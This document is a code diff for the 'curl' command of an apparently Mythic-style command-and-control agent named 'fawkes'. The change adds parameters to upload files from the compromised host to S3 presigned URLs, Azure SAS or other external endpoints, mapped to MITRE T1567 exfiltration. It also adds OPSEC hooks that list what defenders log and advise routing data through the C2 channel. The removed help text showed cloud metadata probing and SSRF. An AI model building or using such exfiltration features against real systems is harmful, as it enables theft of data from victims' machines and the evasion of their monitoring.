@@ -9,11 +9,11 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "curl",
-		Description:         "Make HTTP/HTTPS requests from the agent's network perspective. Useful for cloud metadata, internal services, and SSRF.",
-		HelpString:          "curl -url http://169.254.169.254/latest/meta-data/\ncurl -url https://internal-api.corp.local/health -method POST -body '{\"check\":true}' -headers '{\"Authorization\":\"Bearer token\"}'",
-		Version:             1,
+		Description:         "Make HTTP/HTTPS requests. Upload files for exfiltration to S3 presigned URLs, Azure SAS, or generic endpoints (T1567).",
+		HelpString:          "curl -url <URL> [-method GET|PUT|POST] [-file /path/to/upload] [-upload raw|multipart] [-headers '{\"key\":\"val\"}'] [-body <data>]",
+		Version:             2,
 		Author:              "@galoryber",
-		MitreAttackMappings: []string{"T1106"}, // Native API
+		MitreAttackMappings: []string{"T1106", "T1567", "T1567.002"}, // Native API + Exfiltration Over Web Service
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{
 				agentstructs.SUPPORTED_OS_WINDOWS,
@@ -68,6 +68,29 @@ func init() {
 				},
 			},
 			{
+				Name:             "file",
+				CLIName:          "file",
+				ModalDisplayName: "File to Upload",
+				Description:      "File path to upload as request body (for exfiltration to S3/Azure/HTTP endpoints). Method defaults to PUT when file is set.",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "upload",
+				CLIName:          "upload",
+				ModalDisplayName: "Upload Mode",
+				Description:      "Upload mode: raw (file as body, for PUT/S3 presigned) or multipart (multipart/form-data, for POST endpoints)",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
+				Choices:          []string{"raw", "multipart"},
+				DefaultValue:     "raw",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
 				Name:             "output",
 				CLIName:          "output",
 				ModalDisplayName: "Output Mode",
@@ -113,11 +136,24 @@ func init() {
 		},
 		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
 			url, _ := taskData.Args.GetStringArg("url")
-			msg := fmt.Sprintf("OPSEC WARNING: Outbound HTTP request from agent to %s. Generates network traffic that may be logged by proxy/firewall. SSRF and cloud metadata access (169.254.169.254) are commonly monitored patterns.", url)
+			file, _ := taskData.Args.GetStringArg("file")
+			msg := fmt.Sprintf("OPSEC WARNING: Outbound HTTP request from agent to %s. Generates network traffic that may be logged by proxy/firewall.", url)
+			if file != "" {
+				msg = fmt.Sprintf("OPSEC WARNING: File upload (T1567 — Exfiltration Over Web Service) to %s. Uploading %s via HTTP. Generates significant egress traffic. DLP systems monitor large HTTP PUT/POST payloads to external URLs.", url, file)
+			}
 			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
 				TaskID: taskData.Task.ID, Success: true,
 				OpsecPreBlocked: false, OpsecPreMessage: msg,
 				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
+			}
+		},
+		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
+			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
+				TaskID:              taskData.Task.ID,
+				Success:             true,
+				OpsecPostBlocked:    false,
+				OpsecPostMessage:    "OPSEC AUDIT: HTTP request completed. Outbound connection logged in network monitoring, proxy logs, and EDR. DNS resolution for the target domain cached locally. TLS certificate validation and SNI reveal the target. Consider using the C2 channel for data transfer instead of direct HTTP when possible.",
+				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
 			}
 		},
 		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
@@ -128,16 +164,49 @@ func init() {
 
 			url, _ := taskData.Args.GetStringArg("url")
 			method, _ := taskData.Args.GetStringArg("method")
+			file, _ := taskData.Args.GetStringArg("file")
 			if method == "" {
-				method = "GET"
+				if file != "" {
+					method = "PUT"
+				} else {
+					method = "GET"
+				}
 			}
 
 			displayMsg := fmt.Sprintf("%s %s", method, url)
+			if file != "" {
+				displayMsg += fmt.Sprintf(" (upload: %s)", file)
+			}
 			response.DisplayParams = &displayMsg
 
-			createArtifact(taskData.Task.ID, "API Call",
-				fmt.Sprintf("HTTP %s request to %s", method, url))
+			if file != "" {
+				createArtifact(taskData.Task.ID, "File Read",
+					fmt.Sprintf("HTTP %s upload %s → %s", method, file, url))
+				logOperationEvent(taskData.Task.ID,
+					fmt.Sprintf("[EXFILTRATION] curl: uploading %s to %s via HTTP %s", file, url, method), true)
+			} else {
+				createArtifact(taskData.Task.ID, "API Call",
+					fmt.Sprintf("HTTP %s request to %s", method, url))
+			}
 
+			return response
+		},
+		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
+			response := agentstructs.PTTaskProcessResponseMessageResponse{
+				TaskID:  processResponse.TaskData.Task.ID,
+				Success: true,
+			}
+			responseText, ok := processResponse.Response.(string)
+			if !ok || responseText == "" {
+				return response
+			}
+			url, _ := processResponse.TaskData.Args.GetStringArg("url")
+			method, _ := processResponse.TaskData.Args.GetStringArg("method")
+			if method == "" {
+				method = "GET"
+			}
+			createArtifact(processResponse.TaskData.Task.ID, "Network Connection",
+				fmt.Sprintf("HTTP %s %s (%d bytes response)", method, url, len(responseText)))
 			return response
 		},
 	})
